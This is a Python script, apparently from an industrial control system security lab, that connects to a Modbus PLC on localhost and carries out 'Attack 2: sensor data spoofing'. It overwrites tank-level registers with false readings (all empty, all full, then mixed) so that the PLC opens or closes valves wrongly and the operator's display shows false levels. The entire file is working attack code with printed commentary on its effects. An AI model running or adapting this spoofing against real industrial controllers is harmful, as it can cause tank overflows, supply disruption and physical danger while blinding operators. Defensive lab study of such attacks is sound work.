from pymodbus.client import ModbusTcpClient
import time

PLC = 'localhost'
PORT = 502

print("=" * 55)
print("  ATTACK 2: SENSOR DATA SPOOFING")
print("  Target : Tank level registers QW1, QW2, QW3")
print("=" * 55)

client = ModbusTcpClient(PLC, port=PORT)
if not client.connect():
    print("[ERROR] Cannot connect to PLC.")
    exit()

print("\n[+] Connected to PLC at {}:{}".format(PLC, PORT))

# Read real values
regs = client.read_holding_registers(address=1, count=3)
main = client.read_holding_registers(address=10, count=1)
coils = client.read_coils(address=0, count=3)
print(f"[*] Real tank levels : T1={regs.registers[0]} T2={regs.registers[1]} T3={regs.registers[2]}")
print(f"[*] Main tank level  : {main.registers[0]}")
print(f"[*] Valve states     : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")

print("\n[ATTACK] Step 1 — Spoofing all tanks to 0 (appear EMPTY)...")
print("[ATTACK] Effect: PLC thinks tanks need filling — forces all valves open")
client.write_registers(address=1, values=[0, 0, 0])
time.sleep(1)

regs = client.read_holding_registers(address=1, count=3)
coils = client.read_coils(address=0, count=3)
print(f"[RESULT] HMI now reads: T1={regs.registers[0]} T2={regs.registers[1]} T3={regs.registers[2]}")
print(f"[RESULT] Valve states : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] Operator sees EMPTY tanks — real tanks may be full or overflowing!")

time.sleep(4)

print("\n[ATTACK] Step 2 — Spoofing all tanks to 99 (appear FULL)...")
print("[ATTACK] Effect: PLC closes all valves — tanks actually empty but system halted")
client.write_registers(address=1, values=[99, 99, 99])
time.sleep(1)

regs = client.read_holding_registers(address=1, count=3)
coils = client.read_coils(address=0, count=3)
print(f"[RESULT] HMI now reads: T1={regs.registers[0]} T2={regs.registers[1]} T3={regs.registers[2]}")
print(f"[RESULT] Valve states : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] Operator sees FULL tanks — actual tanks are empty, supply disrupted!")

time.sleep(4)

print("\n[ATTACK] Step 3 — Spoofing T1=0, T2=99, T3=50 (mixed false readings)...")
client.write_registers(address=1, values=[0, 99, 50])
time.sleep(1)

regs = client.read_holding_registers(address=1, count=3)
coils = client.read_coils(address=0, count=3)
print(f"[RESULT] HMI now reads: T1={regs.registers[0]} T2={regs.registers[1]} T3={regs.registers[2]}")
print(f"[RESULT] Valve states : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] Mixed false data — operator cannot trust any sensor reading!")

client.close()
print("\n[DONE] Attack 2 complete. Sensor data fully compromised.")
print("="*55)
